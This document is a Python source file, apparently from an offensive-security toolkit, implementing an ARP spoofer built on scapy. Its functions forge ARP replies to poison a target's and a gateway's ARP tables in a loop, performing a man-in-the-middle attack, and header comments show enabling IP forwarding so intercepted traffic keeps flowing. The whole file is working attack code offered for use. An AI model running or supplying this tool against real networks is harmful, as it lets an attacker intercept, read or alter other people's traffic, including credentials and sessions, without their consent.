# how to forward port on linux
# execute any of the commands below
# 1. sudo sysctl -w net.ipv4.ip_forward = 1
# 2. sudo echo 1 > /proc/sys/net/ipv4/ip_forward


import scapy.all as sp
import argparse
from time import sleep
from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW
from sys import exit


def get_args():
    '''get arguments from command line

    Args:
        None

    Returns:
        None
    '''
    parser = argparse.ArgumentParser('ARP spoofer')
    parser.add_argument('-t', '--target', dest='target', help='target ip')
    parser.add_argument('-s', '--spoof', dest='spoof', help='spoof ip')
    parser.add_argument('-mitm', '--man-in-the-middle', dest='mitm',
                        help='switch for mitm attack option, default is 0')

    args = parser.parse_args()

    target_ip = args.target
    spoof_ip = args.spoof
    mitm = args.mitm
    del args
    return target_ip, spoof_ip, mitm


def check_args(target_ip, spoof_ip):
    '''checks if arguments fetched are valid

    Args:
        target_ip (str): IP address of the target
        spoof_ip (str): spoofed IP address which should be binded with your MAC address
    
    Returns:
        bool: True if all args are valid else exit
    '''
    if not target_ip:
        exit(BRIGHT_RED +
             "[-] Please enter target ip as argument, use -h or --help for more info")
    elif not spoof_ip:
        exit(BRIGHT_RED +
             "[-] Please enter spoof ip as argument, use -h or --help for more info")

    return True


def generate_packet(pdst, hwdst, psrc):
    '''generates spoof packets.
    
    Args:
        pdst (str): IP address of destination
        hwdst (str): MAC address of destination
        psrc (str): IP address of source

    Returns:
        scapy.ARP: spoofed ARP packet with specified configuration
    '''
    packet = sp.ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)
    return packet


def get_mac(ip):
    '''retrieves mac address from the ip.
    
    Args:
        ip (str): IP address

    Returns:
        str: MAC address of specified IP address
    '''
    try:
        arp_req = sp.ARP(pdst=ip)
        brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')

        packet = brdcst / arp_req
        responded_list = sp.srp(packet, timeout=2, verbose=False, retry=3)[0]

        return responded_list[0][1].hwsrc
    except PermissionError:
        print(BRIGHT_RED + '[-] run with sudo.')
        exit()
    except IndexError:
        print(BRIGHT_YELLOW + '\r[!] Unable to find target.')


def spoof(target_ip, spoof_ip, args_status):
    '''spoof target with spoof ip mac

    Args:
        target_ip (str): IP address of target machine
        spoof_ip (str): IP address to be spoofed by attacker's machine
        args_status (bool): True if cli args are valid else False
    
    Returns:
        None
    '''
    if args_status:
        target_mac = get_mac(target_ip)
        PACKET = generate_packet(target_ip, target_mac, spoof_ip)
        sp.send(PACKET, verbose=False)
    else:
        print('[-] Error while spoofing the target ' + target_ip)


def mitm(target_ip, spoof_ip, args_status):
    '''performs man in the middle attack by arp poisoning

    Args:
        target_ip (str): IP address of target machine
        spoof_ip (str): IP address to be spoofed by attacker's machine
        args_status (bool): True if cli args are valid else False
    
    Returns:
        None
    '''
    print(BRIGHT_YELLOW + '[+] Launching MITM ARP Attack....')
    packets_sent = 0
    is_attacking = True
    while is_attacking:
        try:
            spoof(target_ip, spoof_ip, args_status)
            spoof(spoof_ip, target_ip, args_status)
            packets_sent += 2
            print(BRIGHT_WHITE + '\r[+] Packets sent: ' +
                  str(packets_sent), end='')
            sleep(2)
        except KeyboardInterrupt:
            print(BRIGHT_YELLOW +
                  '\r\n[+] Stopping MITM attack and restoring default settings...')
            is_attacking = False


def spoof_only(target_ip, spoof_ip, args_status):
    '''only spoofs the specified target.

    Args:
        target_ip (str): IP address of target machine
        spoof_ip (str): IP address to be spoofed by attacker's machine
        args_status (bool): True if cli args are valid else False
    
    Returns:
        None
    '''
    print(BRIGHT_YELLOW + f'[+] Spoofing {target_ip} as {spoof_ip}....')

    packets_sent = 0
    is_spoofing = True
    while is_spoofing:
        try:
            spoof(target_ip, spoof_ip, args_status)
            print(BRIGHT_WHITE + '\r[+] Packets sent: ' +
                  str(packets_sent), end='')
            packets_sent += 1
            sleep(2)
        except KeyboardInterrupt:
            print(BRIGHT_YELLOW +
                  '\r\n[+] Stopping and restoring default settings...')
            is_spoofing = False


def restore_default_table(dst_ip, src_ip):
    '''restore default arp table of spoofed targets

    Args:
        dst_ip (str): IP address of destination machine
        src_ip (str): IP address to be spoofed by src machine
    
    Returns:
        None
    '''
    try:
        dst_mac = get_mac(dst_ip)
        src_mac = get_mac(src_ip)
        packet = sp.ARP(op=2, pdst=dst_ip, hwdst=dst_mac,
                        psrc=src_ip, hwsrc=src_mac)
        sp.send(packet, verbose=False, count=4)

    except Exception as e:
        print(BRIGHT_RED +
              '[-] Exception occurred while restoring MAC address')
        raise(e)


def run_spoofer(target_ip, spoof_ip, perform_mitm):
    '''start spoofer
    
    Args:
        dst_ip (str): IP address of destination machine
        src_ip (str): IP address to be spoofed by src machine
        perform_mitm (bool): True if MITM has to be performed else False

    Returns:
        None
    '''
    TARGET_IP, SPOOF_IP, MITM = target_ip, spoof_ip, perform_mitm
    ARGS_STATUS = check_args(TARGET_IP, SPOOF_IP)

    if MITM == '1' or MITM:
        print(BRIGHT_YELLOW + '[*] Performing MITM attack...')
        mitm(TARGET_IP, SPOOF_IP, ARGS_STATUS)
    else:
        print(BRIGHT_YELLOW +
              f'[*] Performing Spoof Only on {TARGET_IP} as {SPOOF_IP}...')
        spoof_only(TARGET_IP, SPOOF_IP, ARGS_STATUS)

    print(BRIGHT_YELLOW +
          '[+] Restoring default table for target and gateway....')
    restore_default_table(TARGET_IP, SPOOF_IP)
    restore_default_table(SPOOF_IP, TARGET_IP)

    print(BRIGHT_RED + '[+] Closing ARPSPOOFER...')


if __name__ == '__main__':
    TARGET_IP, SPOOF_IP, MITM = get_args()
    run_spoofer(TARGET_IP, SPOOF_IP, MITM)
